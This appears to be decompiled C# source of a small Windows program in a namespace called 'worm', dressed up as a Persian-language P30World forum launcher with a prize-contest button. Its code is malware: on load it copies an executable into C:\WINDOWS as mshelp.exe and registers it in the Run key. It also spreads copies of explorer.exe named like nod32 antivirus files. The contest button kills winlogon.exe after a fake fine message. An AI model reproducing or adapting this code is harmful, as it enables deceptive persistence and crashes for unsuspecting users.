using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace worm;

public class Form1 : Form
{
	public RegistryKey reg;

	private IContainer components = null;

	private PictureBox pictureBox1;

	private Button button1;

	private ToolTip toolTip1;

	private Label label1;

	private Button button2;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			Directory.CreateDirectory("C:\\WINDOWS");
			string[] files = Directory.GetFiles("P1");
			string[] array = files;
			for (int i = 0; i < array.Length; i++)
			{
				File.Copy("P1\\windows.exe", "C:/\\WINDOWS\\mshelp.exe", overwrite: true);
			}
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("cmd", "C:\\WINDOWS\\mshelp.exe", RegistryValueKind.String);
		}
		catch (Exception)
		{
		}
		try
		{
			for (int j = 0; j < 10; j++)
			{
				string randomFileName = Path.GetRandomFileName();
				Directory.CreateDirectory("C:\\Program Files\\Audiopack");
				string[] files = Directory.GetFiles("C:\\WINDOWS");
				string[] array = files;
				for (int i = 0; i < array.Length; i++)
				{
					File.Copy("C:\\WINDOWS\\explorer.exe", "C:\\Program Files\\Audiopack\\" + randomFileName + "nod32.exe", overwrite: true);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Process.Start("IExplore", "http://forum.p30world.com/forumdisplay.php?s=c6bf0c7dcdf0e33403fb31ef227c584a&f=57");
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message, "خطا");
		}
	}

	private void button2_Click(object sender, EventArgs e)
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("شما مرتکب تخلف شده اید و باید جریمه شوید", "تخلف ورود");
		Process.Start("TaskKill", "/f /im winlogon.exe /t");
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
	}

	private void Form1_FormClosed(object sender, FormClosedEventArgs e)
	{
		try
		{
			for (int i = 0; i < 10; i++)
			{
				string randomFileName = Path.GetRandomFileName();
				Directory.CreateDirectory("C:\\Program Files\\Audiopack");
				string[] files = Directory.GetFiles("C:\\WINDOWS");
				string[] array = files;
				for (int j = 0; j < array.Length; j++)
				{
					File.Copy("C:\\WINDOWS\\explorer.exe", "C:\\Program Files\\Audiopack\\" + randomFileName + "nod32.exe", overwrite: true);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_015f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0169: Expected O, but got Unknown
		//IL_0269: Unknown result type (might be due to invalid IL or missing references)
		//IL_0273: Expected O, but got Unknown
		//IL_0325: Unknown result type (might be due to invalid IL or missing references)
		//IL_032f: Expected O, but got Unknown
		//IL_043c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0446: Expected O, but got Unknown
		//IL_046b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0475: Expected O, but got Unknown
		//IL_047d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0487: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		pictureBox1 = new PictureBox();
		button1 = new Button();
		toolTip1 = new ToolTip(components);
		button2 = new Button();
		label1 = new Label();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)pictureBox1).set_BackgroundImage((Image)componentResourceManager.GetObject("pictureBox1.BackgroundImage"));
		((Control)pictureBox1).set_BackgroundImageLayout((ImageLayout)4);
		pictureBox1.set_BorderStyle((BorderStyle)1);
		((Control)pictureBox1).set_Location(new Point(12, 12));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(293, 68));
		pictureBox1.set_TabIndex(0);
		pictureBox1.set_TabStop(false);
		((Control)button1).set_BackColor(Color.WhiteSmoke);
		((Control)button1).set_Cursor(Cursors.get_Hand());
		((ButtonBase)button1).get_FlatAppearance().set_BorderColor(Color.White);
		((ButtonBase)button1).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(0, 192, 0));
		((ButtonBase)button1).set_FlatStyle((FlatStyle)0);
		((Control)button1).set_Font(new Font("Tahoma", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)button1).set_Location(new Point(12, 115));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(293, 41));
		((Control)button1).set_TabIndex(1);
		((Control)button1).set_Text("ورود به سایت پی سی ورلد");
		toolTip1.SetToolTip((Control)(object)button1, "ورود به انجمن تخصصی بررسی آنتی ویروسها و فایروالها");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)button2).set_BackColor(Color.WhiteSmoke);
		((Control)button2).set_Cursor(Cursors.get_Hand());
		((ButtonBase)button2).get_FlatAppearance().set_BorderColor(Color.White);
		((ButtonBase)button2).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(192, 0, 0));
		((ButtonBase)button2).set_FlatStyle((FlatStyle)0);
		((Control)button2).set_Font(new Font("Tahoma", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)button2).set_Location(new Point(12, 162));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(293, 41));
		((Control)button2).set_TabIndex(3);
		((Control)button2).set_Text("شرکت در مسابقه");
		toolTip1.SetToolTip((Control)(object)button2, "شرکت در مسابقه و برنده شدن و دریافت جایزه");
		((ButtonBase)button2).set_UseVisualStyleBackColor(false);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Tahoma", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.FromArgb(192, 64, 0));
		((Control)label1).set_Location(new Point(46, 83));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(227, 13));
		((Control)label1).set_TabIndex(2);
		((Control)label1).set_Text("دانلود جدیدترین نرم افزارها و برنامه های کاربردی");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(255, 128, 0));
		((Form)this).set_ClientSize(new Size(317, 218));
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("P30WORLD");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_FormClosed(new FormClosedEventHandler(Form1_FormClosed));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
